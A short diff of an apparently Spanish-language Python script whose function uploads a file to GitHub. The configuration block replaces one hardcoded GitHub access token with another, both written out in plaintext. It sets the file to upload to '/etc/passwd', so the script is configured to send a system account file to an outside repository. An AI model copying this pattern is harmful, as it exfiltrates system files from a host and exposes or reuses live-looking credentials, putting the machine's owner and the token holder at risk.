@@ -30,7 +30,7 @@ def upload_to_github(token, repo_owner, repo_name, file_path, commit_message):
         print(response.text)
 
 # Configuración
-token = "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"
+token = "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"
 repo_owner = "lauraalmrui"
 repo_name = "almacenlar"
 file_path = "/etc/passwd"
